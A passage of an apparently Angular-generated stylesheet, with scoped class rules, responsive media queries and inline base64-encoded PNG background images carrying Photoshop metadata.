                background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAbwAAACgCAYAAAB309mLAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA2RpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDozNTMxOTI3NkY1MDZFNjExOEU0N0E3NzY1ODk2M0U5QyIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo0RkJFQjk5MjNFMTIxMUU2QjQ4MEEwQTM1QTEyNjI0OSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo0RkJFQjk5MTNFMTIxMUU2QjQ4MEEwQTM1QTEyNjI0OSIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo1MEQ4MTQ5RTQxMzlFNjExQjQzQkI0NzQwNzQ5OTE3MyIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDozNTMxOTI3NkY1MDZFNjExOEU0N0E3NzY1ODk2M0U5QyIvPiA8L3JkZjpEZXNjcmlwdGlv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) 0 0/contain no-repeat
            }
        }

        .language_V1[_ngcontent-c2] {
            margin-right: 20px
        }

        @media only screen and (max-width:1023px) and (min-width:320px) {
            .watford[_ngcontent-c2] {
                border-bottom: 1px solid #7fcbd3
            }
        }

        @media only screen and (max-width:767px) and (min-width:640px) {
            .watford[_ngcontent-c2] {
                height: 150px
            }
        }

        @media only screen and (max-width:639px) and (min-width:320px) {
            .watford[_ngcontent-c2] {
                height: 40px;
                padding-top: 0;
                border-bottom: 0
            }

            .exeter[_ngcontent-c2] {
                width: 95px;
                height: 31px;
                margin-top: 4px;
                margin-left: 22px;
                float: left;
                background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAF0AAAAeCAIAAADB34VWAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA2RpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDozMDMxOTI3NkY1MDZFNjExOEU0N0E3NzY1ODk2M0U5QyIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpBQkFEQ0YyMzJGMzcxMUU2QTdEN0RGNENGMzI3NTJGNSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpBQkFEQ0YyMjJGMzcxMUU2QTdEN0RGNENGMzI3NTJGNSIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo4NzdDRUFDQ0YzMkVFNjExQkI3OEU0NkU3MUY2NTk1QyIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDozMDMxOTI3NkY1MDZFNjExOEU0N0E3NzY1ODk2M0U5QyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PhYu78wAAAj5SURBVHja7FkJcBPXGX57aSWtDts6LFvGMhhjxRhbxXZxDTgGzJGWw8GEhraZTBgIQyZNSkNxSIfQFCaQaek5UwqZpKEQoHGhDsfQgE1LCbZrLlsEX2AbX5IvWbbu1V59K2EKxAS7ZIYZ0Tc7mtXu27e73/v+7//+fYggCOARGsMLBIqAiGv4uHo7gmyrN9gVYOx+ti/I9gTYAM/vSo/TSPAnDhcPw9W7fLWu4FVXoNvPDjIcK4gkgyxBEYTm+E/trtWmmCcIF2u/81RHX6XD28ujPCmT4ASOAAmKkOC/gYMj6FG7a6lBpSXxyMelecD5xyv1Fd2DDI5TlEIqo3DAo6PpCI4g/TRX1uNaE1mUQb986PDV68sPfFrW0ILwHIUiOM8JHMuL0cPd3Q3KNSeIussD4ViPy8/xkcyXPZ/XbP3sPKVQyOUU4Dmeg6DAXxaFuMB9HINAQIQgc0gUkWNoDIHrSOwbapkksrLSPbjUdnT//PgZkpRigiASJISFCA3LBGgUA5hWSZhVZLqSTFVKE+WEQS5RIRGYpO/H5aPKix6/X0OSYY6IGxP08kBLEE/HRuUbdbmxUVoCC3emaba5fQjB0PQJ6gjHpd3hhDrKsQyKEwKLu3x+fTS5OiO52DwxUSmHHfqH/EebBsrr+61drjaHzzbgnaBXNO6YLycj2r/olQqWh0IKicJ4OX5JZtqbc3InRauhxpaeayqtbDvbOODwQbEmAIYCDAE42ml3n6zteW5GQiTjUjQ9/a+XrRzH+QOBjQsKSgpniemp3LrzcHVd6yDASUBRmFQOJBhAUJh+RPlFwK9P3yz+phGNLKG5J0/PNaeY4/ROj+/lvCwIimPIW/yTD1dt2lfX2IVIUJSEDoYHPCtuIOTtYK4m8arG/orrfRHGl3twIXF8RVZGsl6zdfH8PoercM2vjh6rBlIcgT6X42DaBqEkBVgWiK4FGhgeBDngpitvOCK8Dnh2OsRFK8HxF0v21l5sQLSaEBwcwFjAYQDFe